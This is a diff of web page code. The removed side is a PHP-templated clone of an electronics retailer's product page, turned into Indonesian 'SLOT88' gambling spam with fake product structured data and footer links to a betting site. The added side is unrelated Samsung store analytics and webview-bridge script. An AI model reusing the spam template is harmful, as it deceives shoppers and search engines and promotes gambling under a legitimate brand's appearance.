-                        document.querySelector('variant-selects[data-section="template--17605519376564__main"]');
-                      noScriptInputWrapper.innerHTML = document.querySelector(
-                        '.product-form__noscript-wrapper-template--17605519376564__main'
-                      ).textContent;
-                      variantSwitcher.outerHTML = noScriptInputWrapper.outerHTML;
-                    
-                      document.querySelector('#Variants-template--17605519376564__main').addEventListener('change', function (event) {
-                        hiddenInput.value = event.currentTarget.value;
-                      });
-                    });
-                </script>
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "Product",
-    "name": "<?= $title; ?>",
-    "url": "<?= $canonical; ?>",
-    "image": [
-      "<?= $image; ?>?v=1757450054&width=823"
-    ],
-    "description": "<?= $description; ?>",
-    "sku": "9484875120",
-    "brand": {
-      "@type": "Brand",
-      "name": "<?= $BRAND; ?>"
-    },
-    "offers": [
-      {
-        "@type": "Offer",
-        "sku": "9484875120",
-        "gtin12": "9484875120",
-        "availability": "https://schema.org/OutOfStock",
-        "price": 300.00,
-        "priceCurrency": "SGD",
-        "url": "<?= $canonical; ?>"
-      }
-    ]
-  }
-  </script>
-              </section>
-
-
-  <style>
-  .<?= $BRAND; ?>-fixed-footer {
-      display: flex;
-      justify-content: space-around;
-      position: fixed;
-
-      /* GRADIENT MERAH (pengganti biru) */
-      background: radial-gradient(circle farthest-corner at -4% -12.9%, #168edf 40%, #168edf 90.2%);
-
-      box-shadow: 
-          inset 2px 2px 2px 0px rgba(0, 0, 0, 0.5),
-          7px 7px 20px 0px rgba(0, 118, 253, 0.64),
-          4px 4px 5px 0px rgba(0, 0, 0, 0.1);
-
-      outline: none;
-      padding: 8px 0;
-
-      /* shadow merah */
-      box-shadow: 0 0 10px #00c3ff;
-
-      left: 0;
-      right: 0;
-      bottom: 0;
-      z-index: 99;
-
-      border-radius: 40px 40px 0px 0px;
-      border-style: dashed;
-  }
-
-  .<?= $BRAND; ?>-fixed-footer a {
-      flex-basis: calc((100% - 15px*6)/ 5);
-      text-decoration: none;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: #000000;
-      max-width: 75px;
-      font-size: 13px;
-      font-family: Ubuntu, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  }
-
-  .<?= $BRAND; ?>-fixed-footer a:hover {
-      font-weight: bold;
-  }
-
-  .<?= $BRAND; ?>-fixed-footer .center {
-      transform: scale(1.5) translateY(-5px);
-      background: center no-repeat;
-      background-size: contain;
-      background-color: inherit;
-      border-radius: 50%;
-  }
-
-  .<?= $BRAND; ?>-fixed-footer img {
-      max-width: 20px;
-      margin-bottom: 0;
-      max-height: 20px;
-  }
-  </style>
-
-  <div class="<?= $BRAND; ?>-fixed-footer">
-      <a href="<?= $ampmek; ?>" rel="nofollow noopener" target="_blank">
-          <img layout="intrinsic" height="20px" width="20px" src="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png" alt="BONUS <?= $BRAND; ?>">
-          Promo
-      </a>
-      <a href="<?= $ampmek; ?>" rel="nofollow noopener" target="_blank">
-          <img layout="intrinsic" height="20px" width="20px" src="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png" alt="LOGIN <?= $BRAND; ?>">
-          Login
-      </a>
-      <a href="<?= $ampmek; ?>" rel="nofollow noopener" target="_blank" class="tada">
-          <img layout="intrinsic" height="20px" width="20px" src="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png" alt="DAFTAR <?= $BRAND; ?>">
-          Daftar
-      </a>
-      <a href="<?= $ampmek; ?>" rel="nofollow noopener" target="_blank">
-          <img layout="intrinsic" height="20px" width="20px" src="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png" alt="WHATSAPP <?= $BRAND; ?>">
-          Whatsapp
-      </a>
-      <a href="<?= $ampmek; ?>" rel="nofollow noopener" target="_blank"
-          class="js_live_chat_link live-chat-link">
-          <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png"
-              alt="LIVE CHAT <?= $BRAND; ?>">
-          Live Chat
-      </a>
-  </div>
-  </script>
-
-
-  <input type="hidden" id="page_title"
-        value="<?= $title; ?>" />
-
-  <script type="application/json" id="adobeAnalyticsProductData">
-  {
-    "product_name": "<?= $title; ?>",
-    "mpn_id": "9484875120",
-    "currency": "SGD",
-    "product_price": {
-      "sellingPrice": 259.0,
-      "basePrice": 259.0
-    },
-    "brand": "SLOT88",
-    "lob": "SLOT88",
-    "sub_lob": "<?= $title; ?>"
-  }
-  </script>
-              <style>.slider_media video {max-width: 100%;}</style>
-              
-              <script>
-                $(document).ready(function() {
-                  $(document).on('click', '#apple-care-add', function (event) {
-                    var isChecked = $('#add-apple-care').is(':checked');
-                    if (isChecked) {
-                      $('#add-apple-care').prop('checked', false);
-                      $("#apple-care-add .pdp-care-btn").html("Add");
-                      // $("#apple-added-if").val("");
-                    } else {
-                      $('#add-apple-care').prop('checked', true);
-                      $("#apple-care-add .pdp-care-btn").html("Added");
-                      // $("#apple-added-if").val("added");
-                    }
-                    var appleCareID = $(this).attr("data-index");
-                    $("#apple-care-varid").val(appleCareID);
-                    updatePriceAfterAddingCareOrWarranty();
-                  });
-                  $(document).on('click', '#secWarranty-add', function (event) {
-                    var isChecked2 = $('#add-secWarranty').is(':checked');
-                    if (isChecked2) {
-                      $('#add-secWarranty').prop('checked', false);
-                      $("#secWarranty-add .pdp-secWarranty-btn").html("Add");
-                    } else {
-                      $('#add-secWarranty').prop('checked', true);
-                      $("#secWarranty-add .pdp-secWarranty-btn").html("Added");
-                      // $("#apple-added-if").val("added");
-                    }
-                    var secWarrantyID = $(this).attr("data-index");
-                    $("#secWarranty-varid").val(secWarrantyID);
-                    updatePriceAfterAddingCareOrWarranty();
-                  });
-                
-                  // Reset trade-in values to 0
-                  $(document).on('click', '#no-trade-in', () => {
-                    const $tradeInValueAmounts = document.querySelectorAll('.js-trade-in-value-amount');
-                    const $startTradeInBtn = document.querySelector('.js-product-option-form .js-trade-in-modal-trigger-input');
-                    const $startTradeInBtnLabel = document.querySelector('.js-product-option-form .js-trade-in-modal-trigger-input + label');
-                    const $hiddenSelectedTradeIn = document.querySelector('#selected-trade-in-value');
-                    const $productPrices = document.querySelectorAll('.js-product-price-with-care-warranty');
-                
-                    $tradeInValueAmounts.forEach(($tradeInValueAmount) => {
-                      if ($tradeInValueAmount.classList?.contains('pdp-value-amount')) {
-                        $tradeInValueAmount.innerText = '$0';
-                        $tradeInValueAmount.setAttribute('data-trade-in-value', 0);
-                        $tradeInValueAmount.parentElement?.classList?.add('hidden');
-                      }
-                    });
-                
-                    $startTradeInBtnLabel.innerText = 'Start trade-in';
-                    $hiddenSelectedTradeIn.value = 0;
-                
-                    updatePriceAfterRemovingTradeIn();
-                  });
-                
-                  function updatePriceAfterRemovingTradeIn() {
-                    const isAppleCareAdded = $('#add-apple-care').is(':checked');
-                    const isWarrantyAdded = $('#add-secWarranty').is(':checked');
-                    const isTradeInAdded = document.querySelector('#selected-trade-in-value')?.value;
-                    const $productPrices = document.querySelectorAll('.js-product-price-with-care-warranty');
-                
-                    $('.js-product-price-with-care-warranty').each((i, $productPrice) => {
-                      const price = $($productPrice).data('price');
-                      let updatedPrice;
-                
-                      /* TO BE ADDED */
-                      if (isTradeInAdded && isAppleCareAdded && isWarrantyAdded) {
-                        updatedPrice = $($productPrice).attr('data-price-with-care-and-secWarranty');
-                      } else if (isTradeInAdded && isAppleCareAdded) {
-                        updatedPrice = $($productPrice).attr('data-price-with-care');
-                      } else if (isTradeInAdded && isWarrantyAdded) {
-                        updatedPrice = $($productPrice).attr('data-price-with-secWarranty');
-                      } else if (isTradeInAdded) {
-                        updatedPrice = price;
-                      } else {
-                        updatedPrice = price;
-                      }
-                
-                      $($productPrice).html(updatedPrice);
-                    });
-                  }
-                
-                  function updatePriceAfterAddingCareOrWarranty() {
-                    const isAppleCareAdded = $('#add-apple-care').is(':checked');
-                    const isWarrantyAdded = $('#add-secWarranty').is(':checked');
-                    const hasTradeIn = $('#selected-trade-in-value').val() && $('#selected-trade-in-value').val() !== '0' && $("#selected-trade-in-device").val() !== '';
-                    const hiddenSelectedTradeInValue = $('#selected-trade-in-value').val();
-                    const tradeInPrice = hiddenSelectedTradeInValue
-                      ? formatMoney(hiddenSelectedTradeInValue)
-                      : 0;
-                
-                    $('.js-product-price-with-care-warranty').each(function(i, $productPrice) {
-                      let price = $(this).attr('data-price');
-                      const nmpPriceCalculation = $(this).data('priceCalculation');
-                
-                      if (isAppleCareAdded && isWarrantyAdded && hasTradeIn) {
-                        price = setPriceWithTradeIn('data-price-with-care-and-secWarranty', $productPrice);
-                      } else if (isAppleCareAdded && isWarrantyAdded) {
-                        price = $(this).attr('data-price-with-care-and-secWarranty');
-                      } else if (isAppleCareAdded && hasTradeIn) {
-                        price = setPriceWithTradeIn('data-price-with-care', $productPrice);
-                      } else if (isWarrantyAdded && hasTradeIn) {
-                        price = setPriceWithTradeIn('data-price-with-secWarranty', $productPrice);
-                      } else if (isAppleCareAdded) {
-                        price = $(this).attr('data-price-with-care');
-                      } else if (isWarrantyAdded) {
-                        price = $(this).attr('data-price-with-secWarranty');
-                      } else if (hasTradeIn) {
-                        price = setPriceWithTradeIn('data-price', $productPrice);
-                      }
-                
-                      $(this).html(price);
-                    });
-                  }
-                
-                  function setCookie(name, value, days) {
-                    var expires = "";
-                    if (days) {
-                      var date = new Date();
-                      date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-                      expires = "; expires=" + date.toUTCString();
-                    }
-                    document.cookie = name + "=" + (value || "") + expires + "; path=/";
-                  }
-                
-                  function getCookie(name) {
-                    var nameEQ = name + "=";
-                    var ca = document.cookie.split(';');
-                    for (var i = 0; i < ca.length; i++) {
-                      var c = ca[i];
-                      while (c.charAt(0) == ' ') c = c.substring(1, c.length);
-                      if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
-                    }
-                    return null;
-                  }
-                
-                  function eraseCookie(name) {
-                    document.cookie = name + '=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
-                  }
-                
-                  //added by anusha - 4th variant option cookie approach - start
-                
-                  //check if the main product is inside 4th option product list. if its present, set cookie array
-                  var pid = "7986665160884";
-                  var pid1 = "";
-                  var pid1 = pid1.replace(/s/g, "");
-                  var pid2 = pid1.split('-');
-                  var count = 0;
-                  for (var j = 0; j < pid2.length; j++) {
-                    var a = pid2[j];
-                    var b = pid;
-                    if (a.trim() == b.trim()) {
-                      count++;
-                    }
-                  }
-                  if (count > 0) {
-                    setCookie('optionPIDlist', pid2.join('|'), {
-                      path: '/'
-                    });
-                  }
-                
-                  // if the main product has 'empty 4th product list', then delete all the cookies
-                  if (!pid1.length > 0) {
-                    eraseCookie('option1select');
-                    eraseCookie('option2select');
-                    eraseCookie('option3select');
-                    eraseCookie('optionPIDlist');
-                  }
-                
-                  // cookie values - 3 options
-                  let op1 = getCookie('option1select');
-                  let op2 = getCookie('option2select');
-                  let op3 = getCookie('option3select');
-                
-                  // when customer change the 4th option selection - trigger click event (inorder to set cookie values for 3 options)
-                  if (op1 && $('fieldset.product-form__input[data-opcount="1"]').length > 0) {
-                    setTimeout(function() {
-                      $('fieldset.product-form__input[data-opcount="1"]').find('label[data-title="' + op1 + '"]').trigger('click');
-                    }, 1000);
-                  };
-                  if (op2 && $('fieldset.product-form__input[data-opcount="2"]').length > 0) {
-                    setTimeout(function() {
-                      $('fieldset.product-form__input[data-opcount="2"]').find('label[data-title="' + op2 + '"]').trigger('click');
-                    }, 1000);
-                  };
-                  if (op3 && $('fieldset.product-form__input[data-opcount="3"]').length > 0) {
-                    setTimeout(function() {
-                      $('fieldset.product-form__input[data-opcount="3"]').find('label[data-title="' + op3 + '"]').trigger('click');
-                    }, 1000);
-                  };
-                
-                  let op11 = $("input[type='radio'][name='Title']:checked").val();
-                  let op22 = $("input[type='radio'][name='']:checked").val();
-                  let op33 = $("input[type='radio'][name='']:checked").val();
-                
-                  // when customer dont click on any of the variant buttons - set cookie values for 3 options from current mainprod variant selection
-                  if (op1 == null && op2 == null && op3 == null) {
-                    if (op11 && $('fieldset.product-form__input[data-opcount="1"]').length > 0) {
-                      setTimeout(function() {
-                        $('fieldset.product-form__input[data-opcount="1"]').find('label[data-title="' + op11 + '"]').trigger('click');
-                      }, 1000);
-                    };
-                    if (op22 && $('fieldset.product-form__input[data-opcount="2"]').length > 0) {
-                      setTimeout(function() {
-                        $('fieldset.product-form__input[data-opcount="2"]').find('label[data-title="' + op22 + '"]').trigger('click');
-                      }, 1000);
-                    };
-                    if (op33 && $('fieldset.product-form__input[data-opcount="3"]').length > 0) {
-                      setTimeout(function() {
-                        $('fieldset.product-form__input[data-opcount="3"]').find('label[data-title="' + op33 + '"]').trigger('click');
-                      }, 1000);
-                    };
-                    if (getCookie('optionPIDlist')) {
-                      setCookie('option1select', op11, 7);
-                      setCookie('option2select', op22, 7);
-                      setCookie('option3select', op33, 7);
-                    }
-                  }
-                  // added by anusha - 4th variant option cookie approach - end
-                
-                  if (vat_free_day == true) {
-                    var vat_price_footer = $(".pricestyle").find(".vat_price_bold").text();
-                    if (vat_price_footer != "") {
-                      $("#price-element").find(".footerOr2").css("display", "none");
-                    }
-                  }
-                });
-              </script>
-              <script>
-                $(document).on('change', 'input[type="number"]', function (event) {
-                  this.value = this.value.replace(/[^0-9]+/g, '');
-                  if (this.value < 1) this.value = 0;
-                });
-                $(document).on('keypress', 'input[type="number"]', function (event) {
-                  if (
-                    (event.target.value.length == 0 && event.which == 48) ||
-                    (event.target.value.length == 0 && event.which > 31 && event.which < 48) ||
-                    (event.target.value.length == 0 && event.which > 57 && event.which < 128)
-                  ) {
-                    return false;
-                  }
-                });
-                $(document).on('keypress', 'input[type="number"]', function (event) {
-                  return (((event.which > 47) && (event.which < 58)) || (event.which == 13));
-                });
-                
-                // reload page on back button click since the cached version on Safari browsers is incorrect
-                $(window).bind("pageshow", function(event) {
-                  if (event.originalEvent.persisted) {
-                    window.location.reload();
-                  }
-                });
-              </script>
-              <style data-shopify>
-                .add-on-product-style.add-on-product-style-secWarranty .care-pdp-title {
-                /*     margin-left: 0; */
-                }
-              </style>
-              <style> #shopify-section-template--17605519376564__main .accordion__content p a {color: var(--color-link-dynamic-label) !important;} #shopify-section-template--17605519376564__main .popup_round_border {display: none;} </style>
-          </section>
-          <div id="shopify-section-template--17605519376564__productMarketingContent" class="shopify-section">
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/productMarketingContent.css?v=134348870364535945721742784887" rel="stylesheet" type="text/css" media="all" />
-  <!-- Kontainer teks dengan border & efek MERAH premium 3D -->
-  <div style="
-    background: linear-gradient(145deg, #002575, #00b7ff);
-    border: 1px solid #00b7ff;
-    border-radius: 14px;
-    padding: 22px 26px;
-    color: #ffffff;
-    font-size: 16px;
-    line-height: 1.75;
-    text-align: justify;
-    font-family: 'Poppins', sans-serif;
-
-    /* Premium Red Glass Effect */
-    backdrop-filter: blur(12px) saturate(170%);
-    -webkit-backdrop-filter: blur(12px) saturate(170%);
-
-    /* 3D Red Glow */
-    box-shadow:
-      inset 0 0 18px rgba(100, 224, 255, 0.2),
-      0 0 26px rgba(70, 181, 255, 0.45),
-      0 0 55px rgba(40, 140, 255, 0.32);
-
-    width: 92%;
-    margin: 22px auto;
-    position: relative;
-    overflow: hidden;
-  ">
-
-    <!-- Lapisan shine merah -->
-    <span style="
-      content: '';
-      position: absolute;
-      top: -30%;
-      left: -40%;
-      width: 180%;
-      height: 200%;
-      background: radial-gradient(
-        circle,
-        rgba(120, 194, 255, 0.18) 0%,
-        transparent 70%
-      );
-      animation: shineRedGold 8s linear infinite;
-      pointer-events: none;
-    "></span>
-
-    <p style="position: relative; z-index: 2;">
-  <div class="product-title-style product__title">
-  <h1 style="text-align: center;"><?= $title; ?></h1>
-</div>
-<p style="text-align: justify;"><a href="<?= $canonical; ?>"><?= $BRAND; ?> ft SLOT88</a> merupakan tempat bermain games online yang menghadirkan pengalaman bermain melalui situs slot gacor resmi dengan sistem modern, tampilan responsif, dan navigasi yang mudah digunakan. Platform ini dapat diakses dengan lancar melalui komputer, laptop, tablet, maupun smartphone tanpa memerlukan aplikasi tambahan. Dengan teknologi yang terus diperbarui, <?= $BRAND; ?> menawarkan performa yang stabil, proses transaksi yang praktis, serta akses cepat ke berbagai kategori permainan populer. Didukung layanan yang aktif setiap hari dan antarmuka yang ramah pengguna, <?= $BRAND; ?> menjadi pilihan bagi para pencari pengalaman bermain online yang nyaman, efisien, dan mudah diakses kapan saja serta di mana saja.</p>
-<br>
-
-
-
-
-    <style type="text/css">
-          div.advertisement-placeholder { 
-              text-align: center;
-              padding-bottom: 20px;
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-          }
-          div.advertisement-text p {
-              margin: 0;
-              font-family: Open Sans;
-              font-style: normal;
-              font-weight: normal;
-              font-size: 10px;
-              line-height: 20px;
-              color: #999999;
-          }
-          div.advertisement-banner {
-              margin: 0px auto;
-          }
-          div#div-gpt-ad-billboard-placeholder {
-              width: 996px;
-              margin: 0 auto;
-              background: #F5F5F5;
-              padding-bottom: unset !important;
-              min-height: 200px;
-          }
-          div#div-gpt-ad-lb-placeholder {
-              background: #F5F5F5;
-              padding-bottom: unset !important;
-              min-height: 280px;
-          }
-          .faq-section{
-              max-width:1200px;
-              margin:50px auto;
-              padding:40px 20px;
-              position:relative;
-              background-color: rgba(0, 0, 0, 0.1);
-              backdrop-filter: blur(25px);
-              border-radius: 20px;
-              }
-          
-          .faq-section::before{
-              content:"";
-              position:absolute;
-              top:0;left:50%;
-              transform:translateX(-50%);
-              width:80%;
-              height:2px;
-              background:linear-gradient(90deg,transparent,#007ab3,transparent)
-              }
-              
-          .faq-section h2{
-              text-align:center;
-              font-size:34px;font-weight:700;
-              margin-bottom:50px;
-              background: linear-gradient(135deg, #007ab3, #007ab3, #007ab3);
-              -webkit-background-clip:text;
-              -webkit-text-fill-color:transparent;
-              background-clip:text;
-              font-family:"Poppins",sans-serif;letter-spacing:1px
-          }
-          
-          .faq-container{
-              display:flex;
-              flex-direction:column;
-              gap:25px
-          }
-          
-          .faq-item{
-              background:linear-gradient(145deg,#0a0a0a,#1a1a1a);
-              border:2px solid #71deff;
-              border-radius:20px;overflow:hidden;
-              transition:all .4s ease;box-shadow:0 5px 20px rgba(0,0,0,0.5)
-          }
-          
-          .faq-item:hover{
-              border-color:#71deff;
-              transform:translateX(10px);
-              box-shadow:0 12px 35px #71deff
-          }
-  
-          .faq-question{width:100%;
-              padding:28px 35px;background:transparent;
-              color:#ffffff;
-              font-size:18px;
-              font-weight:600;
-              text-align:left;
-              border:none;cursor:pointer;
-              display:flex;
-              justify-content:space-between;
-              align-items:center;
-              font-family:"Poppins",sans-serif;
-              transition:all .3s ease
-          }
-          
-          .faq-question:hover{
-              color:#007ab3
-          }
-          
-          .faq-question::after{
-              content:'+';
-              font-size:32px;
-              font-weight:300;
-              transition:all .4s ease;
-              color:#007ab3;
-              width:40px;
-              height:40px;
-              display:flex;
-              align-items:center;
-              justify-content:center;
-              border:2px solid #71deff;border-radius:50%;
-              background:rgba(0, 0, 0, 0.1)
-          }
-          
-          .faq-item.active .faq-question::after{
-              transform:rotate(135deg);
-              background:linear-gradient(135deg#997a00#997a00);
-              color:#000;border-color:transparent
-          }
-          
-          .faq-answer{
-              max-height:0;
-              overflow:hidden;
-              transition:max-height .5s ease,padding .5s ease;
-              background:linear-gradient(180deg,rgba(253,228,4,0.05),transparent);
-              padding:0 35px
-          }
-          
-          .faq-item.active .faq-answer{
-              max-height:800px;padding:30px 35px;
-              border-top:1px solid rgba(4, 236, 253, 0.3)
-          }
-          
-          .faq-answer p{
-              color:#e0e0e0;
-              font-size:16px;
-              line-height:2;
-              margin:0;
-              font-family:"Poppins",sans-serif
-          }
-  
-          @media
-              (max-width:768px)
-          {
-          
-          .faq-section
-              {padding:30px 15px}
-          
-          .faq-section h2
-              {font-size:26px}
-          
-          .faq-question
-              {font-size:16px;
-              padding:22px 25px}
-          
-          .faq-question::after
-              {width:35px;
-              height:35px;
-              font-size:28px}
-          
-          .faq-answer
-              {padding:0 25px}
-          
-          .faq-item.active .faq-answer
-              {padding:25px}
-          
-          .faq-item:hover
-              {transform:translateX(5px)}
-              }
-      </style>
-    
+// check PD, GPD
+pageName += ":galaxy\u002Da07\u002Dblack\u002D64gb\u002Dsm\u002Da075fzkdxid".replace(/&/g, ' and ').replace(/  /g,' ')+":buy";
+digitalData.page.pageInfo.pageName = pageName;
+      </script>
+      <!-- Excluding tagging-related scripts in Author mode -->
+      <!-- End Adobe Target Flicker handling -->
+      <!-- Launch Header Embed Code -->
+      <script async="" src="https://assets.adobedtm.com/72afb75f5516/07a30e78d4a7/launch-9f62b0723785.min.js">
+      </script>
+      <!-- End Launch Header Embed Code -->
+      <!-- ugcGallary -->
+      <!-- true -->
+      <!-- script type="text/javascript" src="https://in2.ecom-qa.samsung.com/in/web/dist/shopAppUtil.js"></script>  -->
+      <!--  script type="text/javascript" src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/js/shopAppUtil.js"></script>  -->
       <script>
-          document.addEventListener('DOMContentLoaded',
-              function(){const faqItems=document.querySelectorAll('.faq-item');
-              faqItems.forEach(item=>{const question=item.querySelector('.faq-question');
-              question.addEventListener('click',
-              ()=>{const isActive=item.classList.contains('active');
-              faqItems.forEach(otherItem=>{otherItem.classList.remove('active')});
-              if(!isActive){item.classList.add('active')}})})});
-          </script>
-  
-  
-              <div class="page__overlay" data-view="offCanvasNavToggle" data-off-canvas="close" bis_skin_checked="1">
-              </div>
-  <!-- ========================= FAQ TITLE ========================= -->
+       let isWebView = false;
+			let isPlatformReady = false;
+			class ShopAppUtil {
+				constructor(params) {
+					this.params = params;
+					// let startT = new Date().valueOf();
+					// console.log("★ startTime:", startT);
+					// if(!!window.flutter_inappwebview){
+					let siteCode = "id";
+					let appCookie = document.cookie.match(`(^|;) ?WebView=([^;]*)(;|$)`);
+					if(appCookie != null && appCookie[2] === "Y"){
+						isWebView = true;
+					}else if(siteCode !== "fr"){
+						isWebView = !!window.flutter_inappwebview;
+					}
+					// }
 
-  <h2 class="cok-faq-title">FAQ — Pertanyaan Umum</h2>
+					if(isWebView){
+						window.addEventListener("flutterInAppWebViewPlatformReady", (event) => {
+							// let responseT = new Date().valueOf();
+							// console.log("★ responseTime:", responseT);
+							// console.log("★ responseTime-startTime:", responseT - startT);
+							// console.log("flutterInAppWebViewPlatformReady, web view:", isWebView);
+							isPlatformReady = true;
+							params.readyCallback();
+						});
+					}
+				}
+				callHandler = (methodName, ...params) => {
+					if (isPlatformReady) {
+					return window.flutter_inappwebview.callHandler(methodName, ...params)
+					} else {
+					return Promise.reject("Calling methodName: "+methodName+", but webview not identified")
+					}
+				}
+				logger = (info, value) => {
+					this.params.logger && console.log(" "+info+" "+value+" ")
+				}
+				isWebView = () => {
+					this.logger('Returning isWebView: ', isWebView);
+					return isWebView;
+				}
+				isPlatformReady = () => {
+					this.logger('Returning isPlatformReady: ', isPlatformReady);
+					return isPlatformReady;
+				}
+				getAppVersionCode = () => new Promise((resolve, reject) => {
+					this.callHandler('getAppVersionCode')
+					.then(result => {
+						this.logger("App version", result)
+						resolve(result)
+					})
+					.catch(err => {
+						this.logger("Error in App version", err)
+						reject(err)
+					})
+				})
+				triggerAnalytics = (data) => new Promise((resolve, reject) => {
+					this.callHandler('OnAnalyticsEvent', data)
+					.then(result => {
+						this.logger("OnAnalyticsEvent Success", result)
+						resolve(JSON.stringify(result))
+					})
+					.catch(err => {
+						this.logger("Error in OnAnalyticsEvent", err)
+						reject(err)
+					})
+				})
+				openExternalBrowser = (url) => new Promise((resolve, reject) => {
+					if (typeof url === "string") {
+						url = url.trim();
+					}
+					this.callHandler('openExternalBrowser', url)
+					.then(result => {
+						this.logger("openExternalBrowser Success", result)
+						resolve(JSON.stringify(result))
+					})
+					.catch(err => {
+						this.logger("Error in openExternalBrowser", err)
+						reject(err)
+					})
+				})
+				setupCloseForBack = (exit, confirm, hide, backCallback) => {
+					this.callHandler('configureBackV2', exit, confirm, hide, backCallback)
+					.then(function (result) {
+						console.log(JSON.stringify(result));
+					})
+					.catch(function (err) {
+						console.log("Error in configureBackV2", err)
+					})
+				}
+				setupNormalBack = () => {
+					this.callHandler('configureBackV2', false, false, false, '')
+					.then(function (result) {
+						console.log(JSON.stringify(result));
+					})
+					.catch(function (err) {
+						console.log("Error in configureBackV2", err)
+					})
+				}
+				getUserDetails = () => new Promise((resolve, reject) => {
+					this.callHandler('getUserDetails', 'window.setUserDetails')
+					.then(result => {
+						this.logger("User Details", result)
+						resolve(result)
+					})
+					.catch(err => {
+						this.logger("Error in getUserDetails", err)
+						reject(err)
+					})
+				})
+				updateCartCount = (cartCount) => new Promise((resolve, reject) => {
+					this.callHandler('updateCartCount', cartCount)
+					.then(result => {
+						this.logger("updated Cart Count", result)
+						resolve(result)
+					})
+					.catch(err => {
+						this.logger("Error in updateCartCount", err)
+						reject(err)
+					})
+				})
+				getToken = () => new Promise((resolve, reject) => {
+					this.callHandler('getToken', false)
+					.then(result => {
+						this.logger("GetToken Success", result)
+						resolve(result)
+					})
+					.catch(err => {
+						this.logger("Error in getToken", err)
+						reject(err)
+					})
+				})
+				displayInAppReview = () => new Promise((resolve, reject) => {
+					this.callHandler('displayInAppReview')
+					.then(result => {
+						this.logger("displayInAppReview success")
+						resolve(result)
+					})
+					.catch(err => {
+						this.logger("displayInAppReview failed")
+						reject(err)
+					})
+				})
+			}
+			// [START log_event]
+			function logEvent(name, params) {
+				if (!name) {
+					return;
+				}
 
-  <!-- ========================= FAQ LIST ========================= -->
+				if (window.AnalyticsWebInterface) {
+					// Call Android interface
+					window.AnalyticsWebInterface.logEvent(name, JSON.stringify(params));
+				} else if (window.webkit
+					&& window.webkit.messageHandlers
+					&& window.webkit.messageHandlers.firebase) {
+					// Call iOS interface
+					var message = {
+						command: 'logEvent',
+						name: name,
+						parameters: params
+					};
+					window.webkit.messageHandlers.firebase.postMessage(message);
+				} else {
+					// No Android or iOS interface found
+					console.log("No native APIs found.");
+				}
+			}
+			// [END log_event]
 
-  <div class="cok-faq">
+			// [START set_user_property]
+			function setUserProperty(name, value) {
+				if (!name || !value) {
+					return;
+				}
 
-    <div class="cok-faq-item">
-      <button class="cok-faq-q">❓ Apa itu <?= $BRAND; ?> ft SLOT88 – Duet Maut Keistimewahan Kerja Sama Togel Online & Toto Slot Terpopuler?</button>
-      <div class="cok-faq-a"><?= $BRAND; ?> ft SLOT88 merupakan platform game online yang menyediakan berbagai pilihan permainan seperti Toto Togel, Toto Slot, Bola Parlay, Live Casino, dan kategori permainan populer lainnya dengan sistem yang mudah diakses melalui berbagai perangkat.</div>
-    </div>
+				if (window.AnalyticsWebInterface) {
+					// Call Android interface
+					window.AnalyticsWebInterface.setUserProperty(name, value);
+				} else if (window.webkit
+					&& window.webkit.messageHandlers
+					&& window.webkit.messageHandlers.firebase) {
+					// Call iOS interface
+					var message = {
+						command: 'setUserProperty',
+						name: name,
+						value: value
+					};
+					window.webkit.messageHandlers.firebase.postMessage(message);
+				} else {
+					// No Android or iOS interface found
+					console.log("No native APIs found.");
+				}
+			}
+			// [END set_user_property]
 
-    <div class="cok-faq-item">
-      <button class="cok-faq-q">❓ Apa saja keunggulan yang ditawarkan <?= $BRAND; ?> ft SLOT88?</button>
-      <div class="cok-faq-a">Platform ini menawarkan tampilan website yang modern, sistem yang responsif, pilihan permainan yang lengkap, akses cepat melalui desktop maupun smartphone, serta layanan pelanggan yang tersedia selama 24 jam.</div>
-    </div>
+			/*
+			document.getElementById("event1").addEventListener("click", function() {
+			    console.log("event1");
+			    logEvent("event1", { foo: "bar", baz: 123 });
+			});
 
-    <div class="cok-faq-item">
-      <button class="cok-faq-q">❓ Apakah <?= $BRAND; ?> ft SLOT88 dapat diakses melalui perangkat mobile?</button>
-      <div class="cok-faq-a">Ya. <?= $BRAND; ?> ft SLOT88 dapat diakses menggunakan smartphone Android, iPhone, tablet, laptop, maupun komputer tanpa perlu menginstal aplikasi tambahan sehingga pengguna dapat menikmati layanan dengan lebih fleksibel.</div>
-    </div>
+			document.getElementById("event2").addEventListener("click", function() {
+			  console.log("event2");
+			    logEvent("event2", { size: 123.456 });
+			});
 
-    <div class="cok-faq-item">
-      <button class="cok-faq-q">❓ Bagaimana layanan pelanggan di <?= $BRAND; ?> ft SLOT88?</button>
-      <div class="cok-faq-a"><?= $BRAND; ?> ft SLOT88 menyediakan layanan pelanggan selama 24 jam yang siap membantu pengguna dalam memperoleh informasi mengenai akun, transaksi, maupun penggunaan platform dengan pelayanan yang cepat dan profesional.</div>
-    </div>
+			document.getElementById("userprop").addEventListener("click", function() {
+			    console.log("userprop");
+			    setUserProperty("userprop", "custom_value");
+			});
+			*/
+      </script>
+      <script>
+       const hideHeaderFooterByWindowFlutterInappwebview = () => {
+				//$('.gnb').hide();
+				if(document.querySelector(".gnb") != null && document.querySelector(".gnb").style != null) {
+					document.querySelector(".gnb").style.display='none';
+				}
+				if(document.querySelector(".nv00-gnb") != null && document.querySelector(".nv00-gnb").style != null) {
+					document.querySelector(".nv00-gnb").style.display='none';
+				}
+				if(document.querySelector(".nv00-gnb-v3") != null && document.querySelector(".nv00-gnb-v3").style != null) {
+					document.querySelector(".nv00-gnb-v3").style.display='none';
+				}
+				if(document.querySelector(".nv00-gnb-v4") != null && document.querySelector(".nv00-gnb-v4").style != null) {
+					document.querySelector(".nv00-gnb-v4").style.display='none';
+				}
+				if(document.querySelector(".nv07-explore-floating-navigation") != null) {
